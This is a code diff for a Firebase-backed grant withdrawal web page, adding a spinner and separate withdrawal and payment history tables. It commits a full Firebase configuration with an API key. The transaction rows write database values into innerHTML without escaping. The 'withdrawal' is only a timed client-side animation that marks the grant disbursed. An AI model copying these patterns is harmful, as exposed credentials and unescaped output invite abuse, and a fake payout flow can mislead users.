@@ -2340,6 +2340,11 @@
       margin-bottom: 20px;
     }
 
+    h3 {
+      margin-top: 30px;
+      color: #15317E;
+    }
+
     .logout-btn {
       background-color: #15317E;
       color: white;
@@ -2350,6 +2355,7 @@
       top: 20px;
       right: 20px;
       font-size: 14px;
+      position: absolute;
     }
 
     .logout-btn:hover {
@@ -2395,21 +2401,56 @@
       transform: translateY(2px);
     }
 
-    #processingMessage {
+    .processing-container {
       display: none;
-      font-size: 16px;
-      color: #555;
-      text-align: center;
-      margin-top: 20px;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      margin-top: 30px;
     }
 
-    .collapsible,
-    .content,
+    .spinner {
+      width: 40px;
+      height: 40px;
+      border: 6px solid #ccc;
+      border-top: 6px solid #15317E;
+      border-radius: 50%;
+      animation: spin 1s linear infinite;
+      margin-bottom: 15px;
+    }
+
+    @keyframes spin {
+      0% { transform: rotate(0deg); }
+      100% { transform: rotate(360deg); }
+    }
+
     .transaction-table {
-      margin-top: 20px;
+      width: 100%;
+      border-collapse: collapse;
+      margin-top: 10px;
     }
 
-    .hidden { display: none !important; }
+    .transaction-table th,
+    .transaction-table td {
+      border: 1px solid #ddd;
+      padding: 10px;
+      font-size: 14px;
+      text-align: center;
+    }
+
+    .transaction-table th {
+      background-color: #15317E;
+      color: white;
+    }
+
+    .total {
+      font-weight: bold;
+      color: green;
+    }
+
+    .hidden {
+      display: none !important;
+    }
 
     .animate-message {
       font-size: 18px;
@@ -2438,40 +2479,74 @@
     <button id="withdrawButton" class="withdraw-btn-3d">Withdraw Funds</button>
   </div>
 
-  <div id="processingMessage">Processing your request for $<span id="processingAmount"></span>...</div>
+  <!-- Stylish Processing Animation -->
+  <div id="processingMessage" class="processing-container hidden">
+    <div class="spinner"></div>
+    <p>Processing your withdrawal of $<span id="processingAmount"></span>...</p>
+  </div>
 
-  <div id="disbursedMessage" class="animate-message hidden">Your grant has been disbursed. Check below for status.</div>
+  <!-- Grant Disbursed Message -->
+  <div id="disbursedMessage" class="animate-message hidden">🎉 Your grant has been disbursed. See breakdown below.</div>
 
+  <!-- Withdrawal History -->
   <div class="section">
-    <button class="collapsible" onclick="toggleTransactionHistory()">Show Transaction History</button>
-    <div class="content" id="transactionHistoryContent">
+    <h3>Withdrawal History</h3>
+    <div id="withdrawalHistoryContent">
       <table class="transaction-table">
         <thead>
           <tr>
-            <th>Type</th>
             <th>Amount</th>
             <th>Status</th>
-            <th>Date Paid & Details</th>
+            <th>Date Paid</th>
           </tr>
         </thead>
-        <tbody id="transactionHistoryBody"></tbody>
+        <tbody id="withdrawalHistoryBody"></tbody>
+      </table>
+    </div>
+  </div>
+
+  <!-- Payment History -->
+  <div class="section">
+    <h3>Payment History</h3>
+    <div id="paymentHistoryContent">
+      <table class="transaction-table">
+        <thead>
+          <tr>
+            <th>Amount</th>
+            <th>Status</th>
+            <th>Date</th>
+          </tr>
+        </thead>
+        <tbody id="paymentHistoryBody"></tbody>
         <tfoot>
-          <tr><td colspan="3">Total Payments:</td><td id="totalPaymentAmount">$0.00</td></tr>
-          <tr><td colspan="3">Total Withdrawals:</td><td id="totalWithdrawalAmount">$0.00</td></tr>
+          <tr>
+            <td colspan="2"><strong>Total Paid:</strong></td>
+            <td id="totalPaidAmount">$0.00</td>
+          </tr>
         </tfoot>
       </table>
     </div>
   </div>
 
+  <!-- Modal -->
   <div id="customModal" style="display:none; position:fixed; top:0; left:0; width:100%; height:100%; background:rgba(0,0,0,0.5); align-items:center; justify-content:center; z-index:9999;">
-    <div style="background:white; padding:30px; border-radius:10px; max-width:400px; width:90%; box-shadow:0 4px 12px rgba(0,0,0,0.2); text-align:center;">
+    <div style="background:white; padding:30px; border-radius:10px; max-width:400px; width:90%; box-shadow:0 4px 12px rgba(0,0,0,0.2); text-align:center; animation: fadeIn 0.5s ease;">
       <p id="customModalText" style="font-size:16px;"></p>
       <button onclick="closeCustomModal()" style="margin-top:20px; background-color:#15317E; color:white; border:none; padding:10px 20px; border-radius:5px; cursor:pointer;">OK</button>
     </div>
   </div>
 
   <script>
-    const firebaseConfig = { /* unchanged config */ };
+    const firebaseConfig = {
+      apiKey: "AIzaSyBK5UM0n8-GLvleW7l6B8Hi-_WuC64QA4U",
+      authDomain: "scores-b25a7.firebaseapp.com",
+      databaseURL: "https://scores-b25a7-default-rtdb.firebaseio.com",
+      projectId: "scores-b25a7",
+      storageBucket: "scores-b25a7.appspot.com",
+      messagingSenderId: "1001957936318",
+      appId: "1:1001957936318:web:90fdfb367f82f6a3d8e2ef"
+    };
+
     firebase.initializeApp(firebaseConfig);
     let userApprovedAmount = 0;
 
@@ -2480,8 +2555,13 @@
       const uid = user.uid;
       const userRef = firebase.database().ref("users/" + uid);
 
-      userRef.once("value").then(snapshot => {
-        const data = snapshot.val();
+      userRef.once("value").then(snap => {
+        const data = snap.val();
+        if (data.disbursementStatus === "Your grant has been disbursed") {
+          document.getElementById("disbursedMessage").classList.remove("hidden");
+          document.getElementById("userInfoSection").classList.add("hidden");
+        }
+
         document.getElementById("userName").innerText = "Name: " + (data.username || "N/A");
         document.getElementById("bankName").innerText = "Bank Name: " + (data.bankDetails?.bankName || "N/A");
         document.getElementById("accountNumber").innerText = "Account Number: " + (data.bankDetails?.accountNumber || "N/A");
@@ -2493,8 +2573,9 @@
 
       document.getElementById("withdrawButton").addEventListener("click", function() {
         if (userApprovedAmount <= 0) return alert("No amount available for withdrawal.");
+
         document.getElementById("processingAmount").innerText = userApprovedAmount.toFixed(2);
-        document.getElementById("processingMessage").style.display = "block";
+        document.getElementById("processingMessage").classList.remove("hidden");
 
         setTimeout(() => {
           const now = new Date();
@@ -2512,7 +2593,7 @@
 
           userRef.update(updates).then(() => {
             userApprovedAmount = 0;
-            document.getElementById("processingMessage").style.display = "none";
+            document.getElementById("processingMessage").classList.add("hidden");
             document.getElementById("userInfoSection").classList.add("hidden");
             document.getElementById("disbursedMessage").classList.remove("hidden");
 
@@ -2528,41 +2609,44 @@
       });
 
       userRef.child("transactions").on("value", snapshot => {
-        const transactions = snapshot.val();
-        const body = document.getElementById("transactionHistoryBody");
-        const totalPaymentEl = document.getElementById("totalPaymentAmount");
-        const totalWithdrawalEl = document.getElementById("totalWithdrawalAmount");
-        let totalPayments = 0, totalWithdrawals = 0, html = "";
+        const transactions = snapshot.val() || {};
+        const withdrawalBody = document.getElementById("withdrawalHistoryBody");
+        const paymentBody = document.getElementById("paymentHistoryBody");
+        const totalPaid = document.getElementById("totalPaidAmount");
 
-        if (transactions) {
-          for (let key in transactions) {
-            const t = transactions[key];
-            const amt = parseFloat(t.amount);
-            if (t.type === "Payment") totalPayments += amt;
-            if (t.type === "Withdrawal") totalWithdrawals += amt;
-            html += `
+        let total = 0, withdrawalHTML = "", paymentHTML = "";
+
+        for (let key in transactions) {
+          const tx = transactions[key];
+          const amt = parseFloat(tx.amount).toFixed(2);
+          const date = tx.datePaid || "N/A";
+
+          if (tx.type === "Withdrawal") {
+            withdrawalHTML += `
               <tr>
-                <td>${t.type}</td>
-                <td>$${amt.toFixed(2)}</td>
-                <td>${t.status}</td>
-                <td>${t.datePaid}<br><span style="font-size:12px; color:#555;">Bank: ${t.bankName || "N/A"}<br>Acc No: ${t.accountNumber || "N/A"}</span></td>
+                <td>$${amt}</td>
+                <td>${tx.status}</td>
+                <td>${date}</td>
+              </tr>`;
+          } else {
+            total += parseFloat(tx.amount);
+            paymentHTML += `
+              <tr>
+                <td>$${amt}</td>
+                <td>${tx.status}</td>
+                <td>${date}</td>
               </tr>`;
           }
-        } else html = '<tr><td colspan="4">No transactions found.</td></tr>';
+        }
 
-        body.innerHTML = html;
-        totalPaymentEl.textContent = `$${totalPayments.toFixed(2)}`;
-        totalWithdrawalEl.textContent = `$${totalWithdrawals.toFixed(2)}`;
+        withdrawalBody.innerHTML = withdrawalHTML || `<tr><td colspan="3">No withdrawals yet.</td></tr>`;
+        paymentBody.innerHTML = paymentHTML || `<tr><td colspan="3">No payments yet.</td></tr>`;
+        totalPaid.innerText = `$${total.toFixed(2)}`;
       });
     });
 
     function logout() {
       firebase.auth().signOut().then(() => (window.location.href = "index.html"));
-    }
-
-    function toggleTransactionHistory() {
-      const content = document.getElementById("transactionHistoryContent");
-      content.style.display = content.style.display === "block" ? "none" : "block";
     }
 
     function showCustomModal(message) {
